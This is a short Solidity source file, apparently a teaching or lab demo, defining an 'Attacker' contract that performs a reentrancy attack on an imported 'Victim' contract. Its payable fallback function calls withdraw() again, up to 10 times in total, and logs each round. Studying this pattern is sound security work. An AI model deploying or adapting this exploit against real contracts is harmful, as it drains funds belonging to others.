pragma solidity ^0.4.8;

import './Victim.sol';

contract Attacker {
    Victim v;
    uint public count;

    event LogFallback(uint c, uint balance);

    function Attacker(address victim) {
        //This is interesting. It looks like we are calling Victim constructor, but Victim does not have a constructor
        //it is returning a object of the address provided
        v = Victim(victim);
    }

    function attack() {
        v.withdraw();
    }

    function () payable {
        count++;
        LogFallback(count, this.balance);
        if (count < 10) {
            v.withdraw();
        }
    }

}
